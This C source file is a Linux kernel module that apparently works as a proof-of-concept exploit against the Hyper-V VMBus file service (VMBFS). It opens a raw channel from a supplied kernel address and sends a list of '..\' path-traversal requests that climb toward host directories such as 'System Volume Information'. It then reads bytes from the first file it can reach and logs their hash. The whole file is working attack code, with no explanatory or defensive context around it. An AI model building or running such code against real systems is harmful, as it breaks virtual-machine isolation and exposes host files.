#include <linux/hyperv.h>
#include <linux/module.h>

#define PIPE_DATA 1
#define VMBFS_VERSION_REQUEST 1
#define VMBFS_VERSION_RESPONSE 2
#define VMBFS_GET_INFO_REQUEST 3
#define VMBFS_GET_INFO_RESPONSE 4
#define VMBFS_READ_REQUEST 5
#define VMBFS_READ_RESPONSE 6
#define VMBFS_WIN10 0x00010000

struct pipe_header {
	__le32 type;
	__le32 length;
} __packed;

struct frame {
	struct pipe_header pipe;
	__le32 type;
	__le32 reserved;
	unsigned char body[256];
} __packed;

static const char *const paths[] = {
	"\\..",
	"\\..\\System Volume Information",
	"\\..\\missing-3900000",
	"\\..\\..",
	"\\..\\..\\System Volume Information",
	"\\..\\..\\missing-3900000",
	"\\..\\..\\..",
	"\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\System Volume Information",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\missing-3900000",
};

static struct vmbus_channel *channel;
static unsigned long channel_address;
static unsigned long unused_pfn;
static unsigned long unused_port;
static unsigned long unused_lookup;
static unsigned long unused_dmapage;
static unsigned long unused_dmaunmap;
static unsigned long unused_page;
static unsigned long unused_user;
static struct frame tx;
static unsigned char rx[512];
static unsigned int phase;
static unsigned int path_index;
static unsigned int readable_index = UINT_MAX;
static bool depth_hit;

static void put32(void *destination, u32 value)
{
	unsigned char *out = destination;

	out[0] = value;
	out[1] = value >> 8;
	out[2] = value >> 16;
	out[3] = value >> 24;
}

static void put64(void *destination, u64 value)
{
	put32(destination, value);
	put32((unsigned char *)destination + 4, value >> 32);
}

static u32 get32(const void *source)
{
	const unsigned char *in = source;

	return in[0] | in[1] << 8 | in[2] << 16 | in[3] << 24;
}

static u64 get64(const void *source)
{
	return get32(source) | (u64)get32((const unsigned char *)source + 4) << 32;
}

static unsigned int path_bytes(unsigned int index)
{
	unsigned int length = 0;

	while (paths[index][length]) {
		tx.body[length * 2] = paths[index][length];
		tx.body[length * 2 + 1] = 0;
		length++;
	}
	return length * 2;
}

static int send_frame(unsigned int message, unsigned int body_length)
{
	unsigned int protocol_length = 8 + body_length;

	put32(&tx.pipe.type, PIPE_DATA);
	put32(&tx.pipe.length, protocol_length);
	put32(&tx.type, message);
	put32(&tx.reserved, 0);
	return vmbus_sendpacket(channel, &tx, sizeof(tx.pipe) + protocol_length,
				0, VM_PKT_DATA_INBAND, 0);
}

static int send_version(void)
{
	put32(tx.body, VMBFS_WIN10);
	phase = VMBFS_VERSION_RESPONSE;
	return send_frame(VMBFS_VERSION_REQUEST, 4);
}

static int send_info(unsigned int index)
{
	unsigned int length = path_bytes(index);

	path_index = index;
	phase = VMBFS_GET_INFO_RESPONSE;
	return send_frame(VMBFS_GET_INFO_REQUEST, length);
}

static int send_read(unsigned int index)
{
	unsigned int length = path_bytes(index);
	int i;

	for (i = length - 1; i >= 0; i--)
		tx.body[12 + i] = tx.body[i];
	put32(tx.body, 16);
	put64(tx.body + 4, 0);
	phase = VMBFS_READ_RESPONSE;
	return send_frame(VMBFS_READ_REQUEST, 12 + length);
}

static void hvraw_callback(void *context)
{
	u32 actual = 0;
	u64 request_id = 0;
	u32 pipe_type;
	u32 pipe_length;
	u32 message;
	u32 status;

	do {
		vmbus_recvpacket(channel, rx, sizeof(rx), &actual, &request_id);
		if (!actual)
			break;
		if (actual < 20) {
			pr_info("VMBFS_RX short=%u\n", actual);
			continue;
		}
		pipe_type = get32(rx);
		pipe_length = get32(rx + 4);
		message = get32(rx + 8);
		status = get32(rx + 16);
		pr_info("VMBFS_RX phase=%u actual=%u pipe=%u/%u msg=%u status=%u\n",
			phase, actual, pipe_type, pipe_length, message, status);
		if (pipe_type != PIPE_DATA || actual < 8 + pipe_length ||
		    actual > ((8 + pipe_length + 7) & ~7U) ||
		    message != phase)
			continue;
		if (message == VMBFS_VERSION_RESPONSE) {
			if (status == 0)
				send_info(0);
		} else if (message == VMBFS_GET_INFO_RESPONSE) {
			u32 flags = actual >= 24 ? get32(rx + 20) : 0;
			u64 size = actual >= 32 ? get64(rx + 24) : 0;

			pr_info("VMBFS_INFO path=%s status=%u flags=%u size=%llu\n",
				paths[path_index], status, flags, size);
			if (status == 0 && path_index % 3 != 2)
				depth_hit = true;
			if (status == 0 && path_index % 3 != 2 && !(flags & 1) && size &&
			    readable_index == UINT_MAX)
				readable_index = path_index;
			if (path_index % 3 != 2) {
				if (++path_index < ARRAY_SIZE(paths))
					send_info(path_index);
			} else if (readable_index != UINT_MAX) {
				path_index = readable_index;
				send_read(path_index);
			} else if (!depth_hit && ++path_index < ARRAY_SIZE(paths)) {
				send_info(path_index);
			}
		} else if (message == VMBFS_READ_RESPONSE) {
			u32 returned = pipe_length >= 12 ? pipe_length - 12 : 0;
			u64 hash = 1469598103934665603ULL;
			u32 index;

			for (index = 0; index < min(returned, 16u); index++)
				hash = (hash ^ rx[20 + index]) * 1099511628211ULL;
			pr_info("VMBFS_READ path=%s status=%u returned=%u hash=%016llx\n",
				paths[path_index], status, returned, hash);
		}
	} while (actual);
}

static int parse_ulong(const char *value, unsigned long *result)
{
	unsigned long parsed = 0;
	unsigned int base = 16;
	unsigned int digit;

	if (value[0] == '0' && value[1] == 'x') {
		value += 2;
	}
	if (!*value)
		return -EINVAL;
	while (*value && *value != '\n') {
		if (*value >= '0' && *value <= '9')
			digit = *value - '0';
		else if (*value >= 'a' && *value <= 'f')
			digit = *value - 'a' + 10;
		else if (*value >= 'A' && *value <= 'F')
			digit = *value - 'A' + 10;
		else
			return -EINVAL;
		if (digit >= base || parsed > (ULONG_MAX - digit) / base)
			return -EINVAL;
		parsed = parsed * base + digit;
		value++;
	}
	*result = parsed;
	return 0;
}

static int value_set(const char *value, const struct kernel_param *parameter)
{
	return parse_ulong(value, parameter->arg);
}

static int arm_set(const char *value, const struct kernel_param *parameter)
{
	unsigned long armed;
	int error;

	error = parse_ulong(value, &armed);
	if (error || !armed)
		return error;
	channel = (struct vmbus_channel *)channel_address;
	if (!channel)
		return -EINVAL;
	pr_info("VMBFS_OPEN start channel=%px\n", channel);
	error = vmbus_open(channel, 16 * PAGE_SIZE, 16 * PAGE_SIZE,
			   NULL, 0, hvraw_callback, NULL);
	pr_info("VMBFS_OPEN result=%d state=%u\n", error, channel->state);
	if (!error) {
		error = send_version();
		pr_info("VMBFS_TX version result=%d\n", error);
	}
	return error;
}

static const struct kernel_param_ops value_ops = {.set = value_set};
static const struct kernel_param_ops arm_ops = {.set = arm_set};
module_param_cb(channel, &value_ops, &channel_address, 0200);
module_param_cb(pfn, &value_ops, &unused_pfn, 0200);
module_param_cb(port, &value_ops, &unused_port, 0200);
module_param_cb(lookup, &value_ops, &unused_lookup, 0200);
module_param_cb(dmapage, &value_ops, &unused_dmapage, 0200);
module_param_cb(dmaunmap, &value_ops, &unused_dmaunmap, 0200);
module_param_cb(page, &value_ops, &unused_page, 0200);
module_param_cb(user, &value_ops, &unused_user, 0200);
module_param_cb(arm, &arm_ops, NULL, 0200);

static int __init hvraw_init(void)
{
	return 0;
}

static void __exit hvraw_exit(void)
{
}

module_init(hvraw_init);
module_exit(hvraw_exit);
MODULE_LICENSE("GPL");

